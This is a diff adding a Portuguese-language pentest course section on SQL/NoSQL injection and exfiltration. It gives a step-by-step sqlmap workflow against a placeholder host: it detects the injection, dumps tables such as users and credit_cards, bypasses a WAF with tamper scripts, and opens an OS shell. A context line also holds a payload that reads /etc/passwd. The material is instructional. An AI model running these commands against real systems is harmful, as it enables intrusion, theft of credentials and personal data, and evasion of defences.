@@ -295,3 +295,58 @@ var x = cat('/etc/passwd'); print(x)
 
 **Anterior:** [01-enumeracao-e-brute-force.md](01-enumeracao-e-brute-force.md)
 **Próximo:** [Módulo 13: Frontend Security](../13-frontend-security/)
+
+---
+
+### Resumo da ordem — Por que essa sequência?
+
+Injeção e Exfiltração segue: **detectar → automatizar → extrair → escalar**.
+
+```
+PASSO 1: Detectar injeção → Encontrar inputs vulneráveis
+├── POR QUE: Nem todo input é vulnerável — precisa encontrar onde injetar
+├── O QUE FAZER: Testar aspas simples, aspas dupla, payloads SQL/NoSQL
+├── COMANDO: sqlmap -u "http://target.com/page?id=1" --batch
+├── QUANDO AVANÇAR: Quando sqlmap confirmar injeção
+└── SE DER ERRADO: Se não detectar, teste manual com UNION, SLEEP, Boolean
+
+        ↓
+
+PASSO 2: Enumerar banco → Descobrir estrutura dos dados
+├── POR QUE: Precisa saber tabelas/coleções para extrair dados certos
+├── O QUE FAZER: Listar bancos, tabelas, colunas
+├── COMANDO: sqlmap -u "http://target.com/page?id=1" --dbs --tables
+├── QUANDO AVANÇAR: Quando tiver lista de tabelas com dados interessantes
+└── DICAS: Foque em tabelas: users, admin, orders, credit_cards
+
+        ↓
+
+PASSO 3: Extrair dados → Baixar informações sensíveis
+├── POR QUE: O objetivo final é obter dados (credenciais, PII, etc.)
+├── O QUE FAZER: Dump de tabelas específicas
+├── COMANDO: sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump
+├── QUANDO AVANÇAR: Quando tiver os dados desejados
+└── SE DER ERRADO: Se WAF bloquear, use --tamper ou --random-agent
+
+        ↓
+
+PASSO 4: Bypass de WAF → Evitar detecção
+├── POR QUE: WAFs bloqueiam payloads SQL padrão
+├── O QUE FAZER: Usar encoding, case switching, commentários
+├── COMANDO: sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between
+├── QUANDO AVANÇAR: Quando passar pelo WAF
+└── DICAS: Teste com delay (--delay=2) para evitar rate limit
+
+        ↓
+
+PASSO 5: Escalar → Shell ou admin
+├── POR QUE: Dados são bons, mas shell é melhor
+├── O QUE FAZER: Tentar OS shell, SQL shell, ou criar usuário admin
+├── COMANDO: sqlmap -u "http://target.com/page?id=1" --os-shell
+├── QUANDO AVANÇAR: Quando tiver acesso de sistema
+└── SE DER ERRADO: Se não tiver permissão, tente --sql-shell para comandos SQL
+```
+
+---
+
+**Anterior:** [01-enumeracao-e-brute-force.md](01-enumeracao-e-brute-force.md)
